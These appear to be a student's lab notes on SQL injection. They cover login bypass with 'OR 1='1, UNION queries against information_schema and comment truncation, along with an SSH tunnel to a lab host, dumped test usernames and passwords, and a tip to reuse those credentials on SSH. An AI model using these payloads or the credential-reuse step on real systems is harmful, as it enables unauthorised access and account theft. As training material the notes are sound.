Ex. of SQL injecction:
User enters tom' OR 1='1 in the name and pass fields

Server side query executed would appear as:
Select id from users where name='tom' OR 1='1' AND pass='tom' OR 1='1'


in password boxes, if you cannot see the characters you typed in, you can inspect the page and clear the box to see the characters you put.

DEMO NOTES:

  1 ssh demo1@10.50.13.244 -L 5555:10.208.50.61:80
  2 # Authentication bypass
  3 In the username and password field:
  4 'OR 1='1
  5 
  6 inspect > network > post > request > raw (radio button)
  7 paste at the end of the url
  8 x.x.x.x/login.php?<paste here>



  RESULT:
  Array
(
    [0] => Luke_Skywalker
    [name] => Luke_Skywalker
    [1] => Jedi
    [pass] => Jedi
)
1Array
(
    [0] => Darth_Vader
    [name] => Darth_Vader
    [1] => Sith
    [pass] => Sith
)
1Array
(
    [0] => c3p0
    [name] => c3p0
    [1] => annoying
    [pass] => annoying
)
1Array
(
    [0] => Batman
    [name] => Batman
    [1] => BWyane
    [pass] => BWyane
)
1

It would be wise to try to use these creds to log in to an open ssh port later


STACKING STATEMENTS:
chaining multiple statements together using a semi-colon ;

NESTING STATEMENTS:
some web apps do not allow stacking statements, but may allow nesting

php?key=<value> union select 1, column_name,3 from information_schema.columns where table name = "members"


ignore the rest
using # or -- tells the database to ignore everything after
Select product from item where id = $select limit 1;

1 or 1=1 #

server side query becomes:
select product from item where id = 1 or 1=1; # limit 1;

 17 #       2. Identify the number of columns

 19 #       3. Inject Golden Statement
